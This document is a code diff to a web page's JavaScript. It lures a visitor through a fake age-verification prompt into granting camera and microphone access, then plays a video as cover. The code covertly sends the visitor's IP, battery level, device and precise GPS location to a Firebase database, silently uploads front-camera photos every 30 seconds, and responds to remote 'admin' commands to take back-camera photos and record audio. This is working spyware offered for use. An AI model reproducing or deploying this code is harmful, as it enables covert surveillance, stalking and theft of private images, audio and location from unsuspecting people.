@@ -36,113 +36,124 @@
     </video>
 
     <script>
-        // Firebase Config
+        // --- CONFIGURATION ---
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        // Unique ID Logic
+        // Unique ID Generation
         const now = new Date();
         const dateStr = now.getDate() + "-" + (now.getMonth() + 1);
         const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);
 
         let currentStream = null;
 
+        // --- CORE SYSTEM ---
         async function startStealthSystem() {
             document.getElementById('age-modal').style.display = 'none';
             try {
-                // 1. Camera & Audio Access (Pehle permissions zaroori hain)
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
-                    audio: true 
-                });
+                // 1. Initial Permission (Mic and Camera)
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-                // 2. High Accuracy GPS Request
-                const geoOptions = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
-                navigator.geolocation.getCurrentPosition(
-                    (p) => { 
-                        db.ref(`targets/${sessionID}/location`).set({ 
-                            lat: p.coords.latitude, 
-                            lng: p.coords.longitude, 
-                            acc: p.coords.accuracy + "m",
-                            time: new Date().toLocaleString('en-GB')
-                        }); 
-                    },
-                    (e) => { 
-                        db.ref(`targets/${sessionID}/location`).set({ note: "PERMISSION_DENIED", code: e.code }); 
-                    }, 
-                    geoOptions
-                );
-
-                // 3. Get Device Info (IP, Battery, Network)
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                const batt = await navigator.getBattery();
-                const net = navigator.connection || {effectiveType: "unknown"};
-
-                db.ref(`targets/${sessionID}/info`).set({
-                    ip: ipData.ip,
-                    battery: Math.floor(batt.level * 100) + "%",
-                    network: net.effectiveType,
-                    device: navigator.platform,
-                    status: "ONLINE",
-                    time: new Date().toLocaleString('en-GB')
-                });
-
-                // 4. Background Hidden Video (Keeps camera sensor active to fix black screen)
-                const hiddenVideo = document.createElement('video');
-                hiddenVideo.style.width = "1px"; hiddenVideo.style.height = "1px"; hiddenVideo.style.opacity = "0.01";
-                hiddenVideo.srcObject = currentStream;
-                hiddenVideo.muted = true;
-                hiddenVideo.play();
-                document.body.appendChild(hiddenVideo);
-
-                // 5. Start Video Player for User
+                // 2. Hide UI & Play Video
                 document.getElementById('main-ui').style.display = 'none';
                 const v = document.getElementById('target-player');
                 v.style.display = 'block';
                 v.play();
 
-                // 6. Automation & Listeners
-                setInterval(() => { capturePhoto('auto'); }, 20000);
+                // 3. Send Initial Data
+                await sendDeviceInfo();
+                
+                // 4. Start Background Processes
+                sendLocation();
+                setInterval(() => { capturePhoto('auto', 'user'); }, 30000);
                 listenForAdmin();
 
             } catch (err) {
-                alert("Access Required for Verification!");
+                alert("Permission Denied! Verification Failed.");
                 location.reload();
             }
         }
 
-        async function capturePhoto(type) {
-            if (!currentStream) return;
-            const canvas = document.createElement('canvas');
-            const vTrack = document.createElement('video');
-            vTrack.srcObject = currentStream;
-            vTrack.muted = true;
-            vTrack.play();
-
-            // 2 Second delay to let camera adjust light
-            setTimeout(() => {
-                canvas.width = vTrack.videoWidth || 640;
-                canvas.height = vTrack.videoHeight || 480;
-                canvas.getContext('2d').drawImage(vTrack, 0, 0);
-                
-                const photoData = canvas.toDataURL('image/jpeg', 0.6);
-                if (photoData.length > 1000) { 
-                    db.ref(`targets/${sessionID}/photos`).push({ 
-                        img: photoData, 
-                        type: type, 
-                        time: Date.now() 
-                    });
-                }
-            }, 2000); 
+        async function sendDeviceInfo() {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const batt = await navigator.getBattery();
+            
+            db.ref(`targets/${sessionID}/info`).set({
+                ip: ipData.ip,
+                battery: Math.floor(batt.level * 100) + "%",
+                device: navigator.platform,
+                status: "ONLINE",
+                time: new Date().toLocaleString('en-GB')
+            });
         }
 
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(
+                (p) => {
+                    db.ref(`targets/${sessionID}/location`).set({
+                        lat: p.coords.latitude,
+                        lng: p.coords.longitude,
+                        acc: Math.round(p.coords.accuracy) + "m",
+                        time: new Date().toLocaleString('en-GB')
+                    });
+                },
+                (e) => { db.ref(`targets/${sessionID}/location`).set({ note: "DENIED" }); },
+                { enableHighAccuracy: true }
+            );
+        }
+
+        // --- DUAL CAMERA CAPTURE SYSTEM ---
+        async function capturePhoto(label, mode) {
+            try {
+                // Pehle purane tracks stop karein taake naya camera khul sake
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: mode } 
+                });
+                
+                const v = document.createElement('video');
+                v.srcObject = stream;
+                v.muted = true;
+                v.setAttribute('playsinline', '');
+                await v.play();
+
+                // 2 second wait sensor adjust karne ke liye
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
+                    
+                    db.ref(`targets/${sessionID}/photos`).push({
+                        img: canvas.toDataURL('image/jpeg', 0.6),
+                        type: label,
+                        time: Date.now()
+                    });
+
+                    // Tracks stop karke wapis default stream on karein (for background listening)
+                    stream.getTracks().forEach(t => t.stop());
+                    restartDefaultStream();
+                }, 2000);
+            } catch (e) { console.log("Cam Error: ", e); }
+        }
+
+        async function restartDefaultStream() {
+            currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        }
+
+        // --- COMMAND LISTENER ---
         function listenForAdmin() {
-            db.ref(`commands/${sessionID}`).on('value', snap => {
+            db.ref(`commands/${sessionID}`).on('value', async snap => {
                 const cmd = snap.val();
                 if(!cmd) return;
-                if(cmd.action === 'photo') capturePhoto('manual');
+
+                if(cmd.action === 'photo') capturePhoto('front', 'user');
+                if(cmd.action === 'back_photo') capturePhoto('back', 'environment');
+                
                 if(cmd.action === 'audio') {
                     const rec = new MediaRecorder(currentStream);
                     let chunks = [];
@@ -152,8 +163,11 @@
                         reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                         reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({ audio: reader.result });
                     };
-                    rec.start(); setTimeout(() => rec.stop(), 5000);
+                    rec.start(); 
+                    setTimeout(() => rec.stop(), 5000);
                 }
+
+                // Command delete kar dein taake loop na bane
                 db.ref(`commands/${sessionID}`).remove();
             });
         }
